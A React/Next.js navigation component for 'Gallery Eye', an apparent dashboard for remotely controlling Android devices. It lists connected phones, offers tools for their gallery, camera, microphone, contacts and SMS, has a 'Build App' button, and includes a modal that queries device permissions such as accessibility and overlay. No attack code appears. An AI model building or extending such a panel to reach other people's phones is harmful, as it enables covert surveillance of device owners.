"use client";

import React, { useState, useRef, useEffect } from 'react';
import { createPortal } from 'react-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { 
    MessageSquare, Users, Flashlight, Vibrate, 
    Camera, Bell, Mic, Smartphone, Settings, 
    LogOut, ChevronDown, Check, Zap, Crown, Image as ImageIcon, Package, Trash2, CheckCircle2, Circle,
    Building2, X, Shield, ShieldCheck, ShieldX, Clock, Hash, Wifi, WifiOff, RefreshCw, AlertCircle
} from 'lucide-react';
import Image from 'next/image';
import PlanBadge from './PlanBadge';

// ─── Device Settings Modal ───────────────────────────────────────────────────
interface DeviceSettingsModalProps {
    device: any;
    socket: any;
    userUuid: string;
    onClose: () => void;
}

function DeviceSettingsModal({ device, socket, userUuid, onClose }: DeviceSettingsModalProps) {
    const [permissions, setPermissions] = useState<Record<string, boolean> | null>(null);
    const [isChecking, setIsChecking] = useState(false);
    const [checked, setChecked] = useState(false);
    const devId = device?.deviceId || device?.id || device?._id;
    const isOnline = !!device?.online;

    // Listen for permission_status once
    useEffect(() => {
        if (!socket) return;
        const handler = (data: any) => {
            if (data?.permissions) {
                setPermissions(data.permissions);
                setIsChecking(false);
                setChecked(true);
            }
        };
        socket.on('permission_status', handler);
        return () => { socket.off('permission_status', handler); };
    }, [socket]);

    const handleCheckPermissions = () => {
        if (!socket || !isOnline || isChecking) return;
        setIsChecking(true);
        setChecked(false);
        setPermissions(null);
        socket.emit('check_permissions', { uuid: userUuid, targetDeviceId: devId });
        // Timeout fallback
        setTimeout(() => {
            setIsChecking(false);
        }, 8000);
    };

    const formatLastSeen = (lastSeen: any) => {
        if (!lastSeen) return 'Unknown';
        const d = new Date(lastSeen);
        if (isNaN(d.getTime())) return 'Unknown';
        const now = new Date();
        const diff = Math.floor((now.getTime() - d.getTime()) / 1000);
        if (diff < 60) return `${diff}s ago`;
        if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
        if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
        return d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    };

    const PERMISSION_META: Record<string, { label: string; icon: string; color: string }> = {
        camera: { label: 'Camera', icon: '📷', color: 'cyan' },
        microphone: { label: 'Microphone', icon: '🎙️', color: 'purple' },
        storage: { label: 'Storage / Files', icon: '📂', color: 'amber' },
        contacts: { label: 'Contacts', icon: '👥', color: 'rose' },
        sms: { label: 'SMS & Messages', icon: '💬', color: 'blue' },
        location: { label: 'Location', icon: '📍', color: 'emerald' },
        notifications: { label: 'Notifications', icon: '🔔', color: 'indigo' },
        phone: { label: 'Phone', icon: '📞', color: 'green' },
        overlay: { label: 'Display Overlay', icon: '🖥️', color: 'orange' },
        accessibility: { label: 'Accessibility', icon: '♿', color: 'violet' },
    };

    return typeof document !== 'undefined' ? createPortal(
        <div 
            className="fixed inset-0 z-[400] flex items-center justify-center bg-black/80 backdrop-blur-xl p-4 animate-in fade-in duration-200"
            onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}
        >
            <div className="bg-[#0d0e11] border border-white/10 rounded-3xl w-full max-w-sm shadow-2xl overflow-hidden">
                {/* Header */}
                <div className="p-5 border-b border-white/5 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                        <div className={`w-9 h-9 rounded-xl flex items-center justify-center ${isOnline ? 'bg-emerald-500/10 border border-emerald-500/20' : 'bg-red-500/10 border border-red-500/20'}`}>
                            {isOnline 
                                ? <Wifi className="w-4 h-4 text-emerald-400" /> 
                                : <WifiOff className="w-4 h-4 text-red-400" />
                            }
                        </div>
                        <div>
                            <div className="text-sm font-bold text-white truncate max-w-[180px]">
                                {device?.name || device?.model || device?.deviceName || device?.brand || 'Android Device'}
                            </div>
                            <div className={`text-[10px] font-bold uppercase tracking-wider ${isOnline ? 'text-emerald-400' : 'text-red-400'}`}>
                                {isOnline ? '● Online' : '○ Offline'}
                            </div>
                        </div>
                    </div>
                    <button 
                        onClick={onClose} 
                        className="w-8 h-8 rounded-full bg-white/5 hover:bg-white/10 flex items-center justify-center text-white/40 hover:text-white transition-all"
                    >
                        <X size={16} />
                    </button>
                </div>

                {/* Device Info */}
                <div className="p-5 space-y-3">
                    {/* UUID */}
                    <div className="p-3 bg-white/[0.03] border border-white/5 rounded-2xl flex items-start gap-3">
                        <Hash className="w-4 h-4 text-zinc-400 mt-0.5 shrink-0" />
                        <div className="flex-1 min-w-0">
                            <div className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-1">Device UUID</div>
                            <div className="text-[11px] font-mono text-zinc-300 break-all select-all">{devId || 'N/A'}</div>
                        </div>
                    </div>

                    {/* Last Online */}
                    <div className="p-3 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center gap-3">
                        <Clock className="w-4 h-4 text-zinc-400 shrink-0" />
                        <div>
                            <div className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-0.5">Last Online</div>
                            <div className="text-sm font-semibold text-zinc-200">
                                {isOnline ? (
                                    <span className="text-emerald-400 flex items-center gap-1.5">
                                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse inline-block" />
                                        Active now
                                    </span>
                                ) : formatLastSeen(device?.lastSeen)}
                            </div>
                        </div>
                    </div>

                    {/* Permissions Section */}
                    <div className="p-3 bg-white/[0.03] border border-white/5 rounded-2xl space-y-3">
                        <div className="flex items-center gap-2">
                            <Shield className="w-4 h-4 text-zinc-400" />
                            <div className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest">Permissions</div>
                        </div>

                        {/* Check button */}
                        <button
                            onClick={handleCheckPermissions}
                            disabled={!isOnline || isChecking}
                            className={`w-full py-2.5 rounded-xl text-xs font-bold uppercase tracking-wider flex items-center justify-center gap-2 transition-all ${
                                !isOnline
                                    ? 'bg-white/5 text-white/20 cursor-not-allowed border border-white/5'
                                    : isChecking
                                        ? 'bg-indigo-500/20 text-indigo-300 border border-indigo-500/30 cursor-wait'
                                        : 'bg-indigo-500/10 hover:bg-indigo-500/20 text-indigo-400 border border-indigo-500/20 hover:border-indigo-500/40 active:scale-95'
                            }`}
                        >
                            {isChecking ? (
                                <><RefreshCw className="w-3.5 h-3.5 animate-spin" /> Checking...</>
                            ) : !isOnline ? (
                                <><WifiOff className="w-3.5 h-3.5" /> Device Offline</>
                            ) : (
                                <><ShieldCheck className="w-3.5 h-3.5" /> Check Permissions</>
                            )}
                        </button>

                        {/* Results */}
                        {checked && permissions && (
                            <div className="grid grid-cols-2 gap-1.5 mt-1">
                                {Object.entries(permissions).map(([key, granted]) => {
                                    const meta = PERMISSION_META[key.toLowerCase()] || { label: key, icon: '🔑', color: 'zinc' };
                                    return (
                                        <div
                                            key={key}
                                            className={`flex items-center gap-2 px-2.5 py-2 rounded-xl border text-[11px] font-semibold ${
                                                granted
                                                    ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-300'
                                                    : 'bg-red-500/10 border-red-500/20 text-red-300'
                                            }`}
                                        >
                                            <span>{meta.icon}</span>
                                            <span className="truncate">{meta.label}</span>
                                            {granted 
                                                ? <ShieldCheck className="w-3 h-3 ml-auto shrink-0 text-emerald-400" />
                                                : <ShieldX className="w-3 h-3 ml-auto shrink-0 text-red-400" />
                                            }
                                        </div>
                                    );
                                })}
                            </div>
                        )}

                        {checked && !permissions && (
                            <div className="flex items-center gap-2 text-zinc-500 text-xs py-1">
                                <AlertCircle className="w-4 h-4" />
                                No permission data received. Try again.
                            </div>
                        )}

                        {!isOnline && (
                            <div className="flex items-center gap-2 text-red-400/70 text-[11px]">
                                <WifiOff className="w-3.5 h-3.5" />
                                Connect device to check permissions
                            </div>
                        )}
                    </div>
                </div>
            </div>
        </div>,
        document.body
    ) : null;
}

// ─── Device List ─────────────────────────────────────────────────────────────
function DeviceList({ devices, selectedDeviceId, setSelectedDeviceId, setOpenDropdown, onDeleteDevice, socket, userUuid, onOpenSettings }: any) {
    const [isSelectionMode, setIsSelectionMode] = useState(false);
    const [selectedForDeletion, setSelectedForDeletion] = useState<Set<string>>(new Set());
    const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);

    const toggleSelection = (deviceId: string, e: React.MouseEvent) => {
        e.stopPropagation();
        const newSet = new Set(selectedForDeletion);
        if (newSet.has(deviceId)) newSet.delete(deviceId);
        else newSet.add(deviceId);
        setSelectedForDeletion(newSet);
    };

    const confirmBulkDelete = () => {
        const ids = Array.from(selectedForDeletion);
        onDeleteDevice(ids, true);
        setIsSelectionMode(false);
        setSelectedForDeletion(new Set());
        setShowDeleteConfirm(false);
    };

    return (
        <div className="flex flex-col gap-4">
            <div className="flex items-center justify-between px-1">
                <div className="text-xs font-bold text-fg-3 uppercase tracking-widest">Connected Devices</div>
                {devices.length > 0 && (
                    <button 
                        onClick={() => { setIsSelectionMode(!isSelectionMode); setSelectedForDeletion(new Set()); }}
                        className={`w-8 h-8 rounded-full flex items-center justify-center transition-all ${isSelectionMode ? 'bg-red-500 text-white shadow-[0_0_15px_rgba(239,68,68,0.4)]' : 'bg-white/10 text-white/40 hover:bg-white/20 hover:text-white'}`}
                        title={isSelectionMode ? "Cancel Selection" : "Bulk Delete"}
                    >
                        {isSelectionMode ? <Check size={16} /> : <CheckCircle2 size={16} />}
                    </button>
                )}
            </div>
            {devices.length === 0 ? (
                <div className="p-8 text-center text-fg-3 text-sm bg-black/40 border border-white/5 rounded-3xl">No devices found in database</div>
            ) : (
                <>
                    <div className="flex flex-col gap-2 max-h-[300px] overflow-y-auto pr-2 custom-scrollbar overscroll-contain">
                        {devices.map((device: any) => {
                            const devId = device.deviceId || device.id || device._id;
                            return (
                            <div key={devId} className="relative group">
                                <button
                                    onClick={(e) => {
                                        if (isSelectionMode) toggleSelection(devId, e);
                                        else { setSelectedDeviceId(devId); setOpenDropdown(null); }
                                    }}
                                    className={`w-full flex items-center justify-between gap-4 p-4 rounded-2xl transition-all ${
                                        isSelectionMode 
                                            ? selectedForDeletion.has(devId) 
                                                ? 'bg-red-500/10 border border-red-500/50 scale-[0.98]' 
                                                : 'bg-black/40 border border-white/5 hover:border-white/20'
                                            : selectedDeviceId === devId 
                                                ? 'bg-white/10 border border-white/20 shadow-neo-lg' 
                                                : 'bg-black/40 border border-white/5 hover:bg-white/10'
                                    }`}
                                >
                                    <div className="flex items-center gap-4">
                                        <div className="relative">
                                            <Smartphone className={`w-8 h-8 ${device.online ? 'text-emerald-400' : 'text-fg-4'}`} strokeWidth={1.5} />
                                            <div className={`absolute -bottom-1 -right-1 w-3 h-3 rounded-full border-2 border-[#18191c] ${device.online ? 'bg-emerald-500 shadow-[0_0_8px_#10b981]' : 'bg-red-500'}`} />
                                        </div>
                                        <div className="flex flex-col items-start">
                                            <span className="text-sm font-bold text-fg-1 truncate max-w-[120px]">{device.name || device.model || device.deviceName || device.brand || 'Android Device'}</span>
                                            <span className="text-[10px] text-fg-3 uppercase tracking-wider font-data">{device.online ? 'Online' : 'Offline'}</span>
                                        </div>
                                    </div>
                                    
                                    {isSelectionMode && (
                                        <div className="flex-shrink-0">
                                            {selectedForDeletion.has(devId) ? (
                                                <CheckCircle2 size={24} className="text-red-500" />
                                            ) : (
                                                <Circle size={24} className="text-white/20" />
                                            )}
                                        </div>
                                    )}
                                </button>

                                {/* Settings icon — always visible on mobile, hover-only on desktop */}
                                {!isSelectionMode && (
                                    <button
                                        onClick={(e) => {
                                            e.stopPropagation();
                                            onOpenSettings(device);
                                            setOpenDropdown(null);
                                        }}
                                        title="Device Settings & Permissions"
                                        className="absolute right-3 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-white/5 hover:bg-indigo-500/20 border border-white/5 hover:border-indigo-500/30 flex items-center justify-center text-white/30 hover:text-indigo-400 transition-all sm:opacity-0 sm:group-hover:opacity-100 sm:focus:opacity-100"
                                    >
                                        <Settings size={14} />
                                    </button>
                                )}
                            </div>
                            );
                        })}
                    </div>
                    {isSelectionMode && selectedForDeletion.size > 0 && (
                        <button 
                            onClick={() => setShowDeleteConfirm(true)}
                            className="mt-2 w-full py-3 rounded-xl bg-red-500 hover:bg-red-600 text-white font-bold text-sm shadow-[0_0_15px_rgba(239,68,68,0.3)] transition-all flex items-center justify-center gap-2"
                        >
                            <Trash2 size={16} /> Delete Selected ({selectedForDeletion.size})
                        </button>
                    )}
                </>
            )}

            {showDeleteConfirm && typeof document !== 'undefined' && createPortal(
                <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/80 backdrop-blur-md p-4 animate-in fade-in duration-200">
                    <div className="bg-[#121316] border border-white/10 rounded-3xl p-6 max-w-sm w-full space-y-5 shadow-2xl">
                        <div className="flex items-center gap-3">
                            <div className="w-10 h-10 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400">
                                <Trash2 size={20} />
                            </div>
                            <div>
                                <h3 className="font-bold text-fg-1 text-base">Delete Devices</h3>
                                <p className="text-xs text-fg-3">Confirm device removal</p>
                            </div>
                        </div>
                        <p className="text-sm text-fg-2">
                            Are you sure you want to delete <span className="font-bold text-white">{selectedForDeletion.size}</span> selected device(s)? This action cannot be undone.
                        </p>
                        <div className="flex items-center gap-3">
                            <button
                                onClick={() => setShowDeleteConfirm(false)}
                                className="flex-1 py-2.5 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-white font-semibold text-xs transition-all"
                            >
                                Cancel
                            </button>
                            <button
                                onClick={confirmBulkDelete}
                                className="flex-1 py-2.5 rounded-xl bg-red-500 hover:bg-red-600 text-white font-bold text-xs shadow-[0_0_15px_rgba(239,68,68,0.3)] transition-all"
                            >
                                Confirm Delete
                            </button>
                        </div>
                    </div>
                </div>,
                document.body
            )}
        </div>
    );
}

interface AppNavigationProps {
    devices: any[];
    selectedDeviceId: string | null;
    setSelectedDeviceId: (id: string) => void;
    selectedTool: string | null;
    setSelectedTool: (tool: string | null) => void;
    userPlan: 'basic' | 'standard' | 'premium' | 'enterprise';
    setShowPlansModal: (show: boolean) => void;
    handleSignOut: () => void;
    onOpenAppModal: () => void;
    onDeleteDevice: (deviceId: string) => void;
    user?: any;
    openDropdownProp?: 'tools' | 'devices' | 'profile' | null;
    setOpenDropdownProp?: (val: 'tools' | 'devices' | 'profile' | null) => void;
    socket?: any;
    userUuid?: string;
}

export default function AppNavigation({ 
    devices, selectedDeviceId, setSelectedDeviceId, selectedTool, setSelectedTool, 
    userPlan, setShowPlansModal, handleSignOut, onOpenAppModal, onDeleteDevice, user,
    openDropdownProp, setOpenDropdownProp, socket, userUuid
}: AppNavigationProps) {
    const [internalDropdown, setInternalDropdown] = useState<'tools' | 'devices' | 'profile' | null>(null);
    const [settingsDevice, setSettingsDevice] = useState<any>(null);
    const openDropdown = openDropdownProp !== undefined ? openDropdownProp : internalDropdown;
    const setOpenDropdown = (val: 'tools' | 'devices' | 'profile' | null) => {
        if (setOpenDropdownProp) setOpenDropdownProp(val);
        setInternalDropdown(val);
    };
    const navRef = useRef<HTMLDivElement>(null);

    const onlineDevices = devices.filter(d => d.online);
    const selectedDevice = devices.find(d => d.deviceId === selectedDeviceId);

    // Close dropdowns on click outside
    useEffect(() => {
        const handleClickOutside = (event: MouseEvent) => {
            if (openDropdown !== null && navRef.current && !navRef.current.contains(event.target as Node)) {
                setOpenDropdown(null);
            }
        };
        document.addEventListener('mousedown', handleClickOutside);
        return () => document.removeEventListener('mousedown', handleClickOutside);
    }, [openDropdown, openDropdownProp, setOpenDropdownProp]);

    const backdropPortal = openDropdown !== null && typeof window !== 'undefined' 
        ? createPortal(
            <div 
                className="fixed inset-0 z-[90] pointer-events-auto cursor-default" 
                onClick={(e) => {
                    e.stopPropagation();
                    setOpenDropdown(null);
                }} 
            />, 
            document.body
        ) 
        : null;

    const tools = [
        { id: 'gallery', label: 'Gallery', icon: ImageIcon, color: 'text-pink-400' },
        { id: 'camera', label: 'Camera', icon: Camera, color: 'text-cyan-400' },
        { id: 'audio', label: 'Microphone', icon: Mic, color: 'text-purple-400' },
        { id: 'notifications', label: 'Alerts', icon: Bell, color: 'text-indigo-400' },
        { id: 'flashlight', label: 'Flashlight', icon: Flashlight, color: 'text-amber-400' },
        { id: 'vibration', label: 'Vibration', icon: Vibrate, color: 'text-emerald-400' },
        { id: 'contacts', label: 'Contacts', icon: Users, color: 'text-rose-400' },
        { id: 'sms', label: 'SMS & Messages', icon: MessageSquare, color: 'text-blue-400' }
    ];

    const currentToolData = tools.find(t => t.id === selectedTool);
    const ToolIcon = currentToolData?.icon || Zap;
    const toolLabel = currentToolData?.label || 'Tools';

    const toggleDropdown = (menu: 'tools' | 'devices' | 'profile') => {
        setOpenDropdown(openDropdown === menu ? null : menu);
    };

    const handleSelectTool = (toolId: string) => {
        if (toolId !== selectedTool && typeof window !== 'undefined') {
            if (selectedTool) {
                window.history.replaceState({ tool: toolId }, '', '#tool=' + toolId);
            } else {
                window.history.pushState({ tool: toolId }, '', '#tool=' + toolId);
            }
        }
        setSelectedTool(toolId);
        setOpenDropdown(null);
    };

    const dropdownVariants = {
        hidden: { opacity: 0 },
        visible: { opacity: 1, transition: { duration: 0.15, ease: "linear" } as any },
        exit: { opacity: 0, transition: { duration: 0.1, ease: "linear" } as any }
    };

    // ── Plan-based logo glow (enterprise included) ──
    const logoGlowClass = 
        userPlan === 'enterprise'
            ? 'bg-gradient-to-br from-purple-600/40 via-black to-indigo-600/30 border-2 border-purple-400 shadow-[0_0_24px_rgba(147,51,234,0.85),0_0_50px_rgba(99,102,241,0.4)] animate-pulse-soft'
        : userPlan === 'premium' 
            ? 'bg-gradient-to-br from-amber-500/30 via-black to-purple-600/30 border-2 border-amber-400 shadow-[0_0_20px_rgba(245,158,11,0.8)] animate-pulse-soft' 
            : userPlan === 'standard'
            ? 'bg-gradient-to-br from-emerald-500/30 via-black to-cyan-600/30 border-2 border-emerald-400 shadow-[0_0_15px_rgba(16,185,129,0.7)]'
            : 'bg-zinc-900 border border-zinc-700 shadow-[0_0_10px_rgba(255,255,255,0.1)]';

    // ── Plan-based avatar ring (enterprise included) ──
    const avatarRingClass =
        userPlan === 'enterprise' ? 'ring-purple-400 shadow-[0_0_28px_rgba(147,51,234,0.8),0_0_55px_rgba(99,102,241,0.35)]' :
        userPlan === 'premium' ? 'ring-amber-400 shadow-[0_0_25px_rgba(245,158,11,0.7)]' :
        userPlan === 'standard' ? 'ring-emerald-400 shadow-[0_0_20px_rgba(16,185,129,0.6)]' :
        'ring-zinc-600 shadow-md';

    return (
        <>
            {backdropPortal}
            <div ref={navRef} className="fixed top-0 left-0 right-0 z-[100] px-2 sm:px-4 py-2 sm:py-3 md:px-8 pointer-events-none">
            <nav className="max-w-7xl mx-auto flex items-center justify-between glass-panel rounded-2xl p-1.5 sm:p-2 px-3 sm:px-4 shadow-neo pointer-events-auto">
                
                {/* Logo with Plan Glow (Click to go Home) */}
                <button
                    type="button"
                    onClick={() => {
                        setSelectedTool(null);
                        if (typeof window !== 'undefined' && window.location.hash.includes('tool=')) {
                            window.history.replaceState(null, '', window.location.pathname + window.location.search);
                        }
                    }}
                    title="Back to Command Center Home"
                    aria-label="Return to Home Screen"
                    className="flex items-center shrink-0 group cursor-pointer active:scale-95 transition-transform focus:outline-none"
                >
                    <div className={`w-9 h-9 sm:w-10 sm:h-10 rounded-xl shrink-0 aspect-square flex items-center justify-center relative overflow-hidden transition-all duration-300 group-hover:scale-105 ${logoGlowClass}`}>
                        <img src="/gallery-eye-logo.jpg" alt="Gallery Eye" className="w-full h-full object-cover z-10 block" />
                    </div>
                </button>

                <div className="flex items-center gap-1.5 sm:gap-4 flex-1 justify-end">
                    
                    {/* Tools Dropdown */}
                    <div className="relative">
                        <button 
                            id="tutorial-tools-selector"
                            onClick={() => toggleDropdown('tools')}
                            className={`flex items-center gap-2 px-3 md:px-4 py-2 rounded-xl transition-all duration-300 ${openDropdown === 'tools' || selectedTool ? 'neo-pressed text-accent' : 'neo-button text-fg-2 hover:text-fg-1'}`}
                        >
                            <ToolIcon className="w-5 h-5" />
                            <span className="hidden sm:block font-semibold text-sm">{toolLabel}</span>
                            <ChevronDown className={`w-4 h-4 transition-transform duration-300 ${openDropdown === 'tools' ? 'rotate-180' : ''}`} />
                        </button>

                        <AnimatePresence>
                            {openDropdown === 'tools' && (
                                <motion.div
                                    variants={dropdownVariants}
                                    initial="hidden"
                                    animate="visible"
                                    exit="exit"
                                    className="fixed left-4 right-4 top-[75px] w-auto sm:absolute sm:top-[120%] sm:left-1/2 sm:right-auto sm:-translate-x-1/2 sm:mt-2 sm:w-[380px] p-6 neo-surface rounded-[2rem] border border-white/5 z-[200] pointer-events-auto cursor-default shadow-2xl"
                                >
                                    <div className="text-xs font-bold text-fg-3 uppercase tracking-widest mb-6 px-2">Select Tool</div>
                                    <div className="grid grid-cols-4 gap-4">
                                        {tools.map((tool) => (
                                            <button
                                                key={tool.id}
                                                onClick={() => handleSelectTool(tool.id)}
                                                className="flex flex-col items-center justify-start gap-3 p-2 rounded-2xl hover:bg-white/10 active:scale-95 transition-all group cursor-pointer"
                                            >
                                                <div className={`w-16 h-16 rounded-2xl neo-surface flex items-center justify-center border border-white/5 group-hover:shadow-[0_0_20px_rgba(255,255,255,0.1)] transition-all ${selectedTool === tool.id ? 'bg-white/10 ring-2 ring-accent shadow-[0_0_15px_rgba(var(--accent),0.3)]' : ''}`}>
                                                    <div className={`p-3 rounded-xl bg-gradient-to-br from-white/10 to-transparent`}>
                                                        <tool.icon className={`w-6 h-6 ${tool.color} group-hover:scale-110 transition-transform`} strokeWidth={2} />
                                                    </div>
                                                </div>
                                                <span className="text-xs font-semibold text-fg-2 group-hover:text-white text-center leading-tight">{tool.label}</span>
                                            </button>
                                        ))}
                                    </div>
                                </motion.div>
                            )}
                        </AnimatePresence>
                    </div>

                    {/* Devices Dropdown */}
                    <div className="relative">
                        <button 
                            id="tutorial-device-selector"
                            onClick={() => toggleDropdown('devices')}
                            className={`flex items-center gap-2.5 px-3 md:px-4 py-2 rounded-xl transition-all duration-300 ${openDropdown === 'devices' ? 'neo-pressed text-accent' : 'neo-button text-fg-2 hover:text-fg-1'}`}
                        >
                            <div className="relative flex items-center justify-center">
                                <Smartphone className="w-5 h-5" />
                                <div className={`absolute -bottom-0.5 -right-0.5 w-2.5 h-2.5 rounded-full border-2 border-[#0a0a0c] ${
                                    devices.some(d => d.online) 
                                        ? 'bg-emerald-500 shadow-[0_0_8px_#10b981]' 
                                        : 'bg-red-500 shadow-[0_0_8px_#ef4444]'
                                }`} />
                            </div>
                            <span className="hidden sm:block font-semibold text-sm max-w-[100px] truncate">
                                {selectedDevice?.name || selectedDevice?.model || selectedDevice?.deviceName || selectedDevice?.brand || 'Devices'}
                            </span>
                            <ChevronDown className={`w-4 h-4 transition-transform duration-300 ${openDropdown === 'devices' ? 'rotate-180' : ''}`} />
                        </button>

                        <AnimatePresence>
                            {openDropdown === 'devices' && (
                                <motion.div
                                    variants={dropdownVariants}
                                    initial="hidden"
                                    animate="visible"
                                    exit="exit"
                                    className="fixed left-4 right-4 top-[75px] w-auto sm:absolute sm:top-[120%] sm:left-1/2 sm:right-auto sm:-translate-x-1/2 sm:mt-2 sm:w-[360px] p-6 neo-surface rounded-[2rem] border border-white/5 z-[200] pointer-events-auto cursor-default shadow-2xl"
                                >
                                    <DeviceList 
                                        devices={devices} 
                                        selectedDeviceId={selectedDeviceId} 
                                        setSelectedDeviceId={setSelectedDeviceId} 
                                        setOpenDropdown={setOpenDropdown} 
                                        onDeleteDevice={onDeleteDevice}
                                        socket={socket}
                                        userUuid={userUuid}
                                        onOpenSettings={(dev: any) => setSettingsDevice(dev)}
                                    />
                                </motion.div>
                            )}
                        </AnimatePresence>
                    </div>

                    <div className="w-px h-8 bg-white/10 mx-1 md:mx-2" />

                    {/* App Maker Button */}
                    <button 
                        id="tutorial-access-app-nav"
                        onClick={onOpenAppModal}
                        className="flex items-center gap-2 px-3 md:px-4 py-2 rounded-xl neo-button text-accent hover:text-accent-hi transition-all"
                    >
                        <Package className="w-5 h-5" />
                        <span className="hidden sm:block font-bold text-sm">Build App</span>
                    </button>

                    {/* Profile Dropdown */}
                    <div className="relative">
                        <button 
                            id="tutorial-account-btn"
                            onClick={() => toggleDropdown('profile')}
                            className={`flex items-center justify-center w-10 h-10 md:w-auto md:px-4 py-2 rounded-xl transition-all duration-300 ${openDropdown === 'profile' ? 'neo-pressed text-accent' : 'neo-button text-fg-2 hover:text-fg-1'}`}
                        >
                            <Settings className="w-5 h-5 md:mr-2" />
                            <span className="hidden md:block font-semibold text-sm">Account</span>
                        </button>

                        <AnimatePresence>
                            {openDropdown === 'profile' && (
                                <motion.div
                                    variants={dropdownVariants}
                                    initial="hidden"
                                    animate="visible"
                                    exit="exit"
                                    className="fixed left-4 right-4 top-[75px] w-auto sm:absolute sm:top-[120%] sm:left-1/2 sm:right-auto sm:-translate-x-1/2 sm:mt-2 sm:w-[280px] p-5 neo-surface rounded-[2rem] border border-white/5 z-[200] pointer-events-auto cursor-default shadow-2xl"
                                >
                                        <div className="p-4 mb-3 rounded-2xl neo-surface flex flex-col items-center text-center border border-white/10 shadow-lg">
                                            <div className={`w-16 h-16 rounded-full mb-3 flex items-center justify-center overflow-hidden ring-2 ${avatarRingClass}`}>
                                                {user?.image ? (
                                                    <img src={user.image} alt="Profile" className="w-full h-full object-cover" />
                                                ) : (
                                                    <img src="/gallery-eye-logo.jpg" alt="Profile" className="w-full h-full object-cover" />
                                                )}
                                            </div>
                                            {/* Email right below avatar */}
                                            {user?.email ? (
                                                <div className="text-xs sm:text-sm font-bold text-white font-mono tracking-tight mb-1 truncate max-w-[240px]" title={user.email}>
                                                    {user.email}
                                                </div>
                                            ) : (
                                                <div className="text-xs sm:text-sm font-bold text-white font-mono tracking-tight mb-1">
                                                    Account Profile
                                                </div>
                                            )}
                                            {user?.name && user.name !== user.email && (
                                                <div className="text-[11px] font-medium text-zinc-400 mb-3 truncate max-w-[240px]">
                                                    {user.name}
                                                </div>
                                            )}
                                            {/* Highlighted Plan right underneath */}
                                            <div className="mt-1 w-full flex justify-center">
                                                <PlanBadge plan={userPlan} />
                                            </div>
                                        </div>
                                        
                                        <div className="flex flex-col gap-2">
                                            <button 
                                                onClick={() => { setShowPlansModal(true); setOpenDropdown(null); }}
                                                className="flex items-center gap-3 p-3 rounded-xl neo-surface hover:neo-pressed transition-all text-accent group"
                                            >
                                                <Crown className="w-4 h-4 group-hover:scale-110 transition-transform" />
                                                <span className="text-sm font-bold">Upgrade Plan</span>
                                            </button>

                                            <button 
                                                onClick={() => { handleSignOut(); setOpenDropdown(null); }}
                                                className="flex items-center gap-3 p-3 rounded-xl neo-surface hover:neo-pressed transition-all text-danger group"
                                            >
                                                <LogOut className="w-4 h-4 group-hover:-translate-x-1 transition-transform" />
                                                <span className="text-sm font-bold">Sign Out</span>
                                            </button>
                                        </div>
                                    </motion.div>
                            )}
                        </AnimatePresence>
                    </div>

                </div>
            </nav>
        </div>

        {/* Device Settings & Permissions Modal */}
        {settingsDevice && (
            <DeviceSettingsModal
                device={settingsDevice}
                socket={socket}
                userUuid={userUuid || ''}
                onClose={() => setSettingsDevice(null)}
            />
        )}
        </>
    );
}
